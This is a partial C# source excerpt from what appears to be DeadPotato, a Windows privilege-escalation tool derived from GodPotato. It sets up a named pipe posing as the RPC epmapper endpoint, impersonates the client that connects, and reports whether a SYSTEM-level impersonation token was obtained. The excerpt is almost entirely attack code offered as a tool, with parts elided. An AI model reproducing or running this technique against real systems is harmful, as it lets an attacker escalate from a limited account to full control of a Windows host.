...
using SharpToken;
using static DeadPotato.NativeAPI.NativeMethods;
using static DeadPotato.NativeAPI.NewOrcbRPC;

namespace DeadPotato.NativeAPI
{
    public class GodPotatoContext
    {
        ...
        public readonly string serverPipe = $"\\\\.\\pipe\\{"DeadPotato"}\\pipe\\epmapper";
        public readonly string clientPipe = $"ncacn_np:localhost/pipe/{"DeadPotato"}[\\pipe\\epmapper]";
        ...
        protected void PipeServer()
        {
            ...
            try
            {
                ...
                if (Program.verbose) { ConsoleWriter.WriteLine("[*] CreateNamedPipe " + serverPipe); }
                if (pipeServerHandle != BAD_HANLE)
                {
                    ...
                    if ((isConnect || Marshal.GetLastWin32Error() == ERROR_PIPE_CONNECTED) && IsStart)
                    {
                        ...
                        if (ImpersonateNamedPipeClient(pipeServerHandle))
                        {
                            ...
                            if (!Program.isInShell) UI.printColor("(<darkred>*</darkred>) Initiating procedure as <darkred>" + systemIdentity.Name + "</darkred>");
                            if (!Program.isInShell) UI.printColor("\n(" + (systemIdentity.ImpersonationLevel.ToString() == "Impersonation" ? "<darkgreen>+</darkgreen>" : "<darkred>-</darkred>") + ") Is impersonation possible in current context? " + (systemIdentity.ImpersonationLevel.ToString() == "Impersonation" ? "<darkgreen>YES</darkgreen>" : "<darkred>NO</darkred>"));

                            if(systemIdentity.ImpersonationLevel.ToString() != "Impersonation")
                            {
                                UI.printColor("\n(<darkred>-</darkred>) Aborting due to insufficient privileges.\n\n");
                                Environment.Exit(0);
                            }
